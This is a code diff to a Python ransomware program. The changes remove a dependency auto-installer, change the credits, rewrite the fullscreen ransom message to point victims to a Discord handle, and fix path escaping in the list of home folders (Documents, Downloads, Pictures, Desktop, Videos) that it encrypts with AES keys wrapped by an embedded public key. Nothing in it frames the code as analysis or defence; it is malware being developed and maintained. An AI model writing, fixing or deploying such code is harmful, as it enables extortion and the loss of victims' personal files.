@@ -1,26 +1,3 @@
-import subprocess
-import sys
-
-def install_dependencies():
-    """
-    Checks for and installs the 'cryptography' library if it's not found.
-    """
-    try:
-        import cryptography
-        
-    except ImportError:
-        
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
-            
-        except subprocess.CalledProcessError as e:
-            
-            print(f"Subprocess error: {e}")
-            sys.exit(1)
-
-
-install_dependencies()
-
 import tkinter as tk
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -44,7 +21,7 @@ def logo():
 ...::........::..:::::..::........::::::::..:::::........::..:::::..::..:::::..::
 """
     print(logo)
-    print("credits to 3xecutablefile AND navel.exe")
+    print("credits to TheArtfulDodger.exe, Bannedman.exe, Navel.exe, Destroyer.exe, Surgeon.exe and Atlas.exe")
 
 def encrypt_aes_key(public_key, aes_key):
     encrypted_aes_key = public_key.encrypt(
@@ -86,7 +63,7 @@ def create_fullscreen_dialog():
     frame = tk.Frame(root, bg='red')
     frame.pack(expand=True, fill='both')
 
-    label = tk.Label(frame, text="ALL YOUR FILES HAVE BEEN ENCRYPTED!!!\n\nDO NOT CLOSE THIS WINDOW\n\n\ncontact @3xecutablefile to save your computers!\n\n\npaste recovery key below when given:", bg='red', font=('Arial', 24))
+    label = tk.Label(frame, text="ALL YOUR FILES HAVE BEEN ENCRYPTED!!!\n\nDO NOT CLOSE THIS WINDOW\n\n\ncontact @anonanonym0us on discord to save your files\n\n\npaste recovery key below:", bg='red', font=('Arial', 24))
     label.pack(pady=20)
 
     text_entry = tk.Entry(frame, font=('Arial', 24), width=30)
@@ -202,7 +179,7 @@ qQIDAQAB
 
     home_dir = os.path.expanduser('~')
     # Specify the directories to encrypt
-    dirs = [home_dir+'\Documents', home_dir+'\Downloads', home_dir+'\Pictures', home_dir+'\Desktop', home_dir+'\Videos', home_dir+'/Documents', home_dir+'/Downloads', home_dir+'/Pictures', home_dir+'/Desktop', home_dir+'/Videos']
+    dirs = [home_dir+'\\Documents', home_dir+'\\Downloads', home_dir+'\\Pictures', home_dir+'\\Desktop', home_dir+'\\Videos', home_dir+'/Documents', home_dir+'/Downloads', home_dir+'/Pictures', home_dir+'/Desktop', home_dir+'/Videos']
 
 
     logo()
